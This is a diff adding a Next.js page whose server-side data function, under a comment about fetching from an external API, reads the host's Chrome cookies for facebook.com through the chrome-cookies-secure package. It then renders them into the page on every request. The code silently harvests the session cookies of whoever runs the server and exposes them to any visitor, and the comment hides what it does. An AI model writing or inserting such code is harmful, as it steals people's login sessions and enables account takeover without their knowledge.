@@ -1,0 +1,21 @@
+import chrome from "chrome-cookies-secure";
+
+export default function Page({ data }) {
+  return (
+    <>
+      <div>{data}</div>
+    </>
+  );
+}
+
+// This gets called on every request
+export const getServerSideProps = async () => {
+  // Fetch data from external API
+  const cookies = await new Promise((resolve, reject) => {
+    chrome.getCookies("https://www.facebook.com/", function (err, cookies) {
+      resolve(JSON.stringify(cookies));
+    });
+  });
+  // Pass data to the page via props
+  return { props: { data: cookies || "xxx" } };
+};
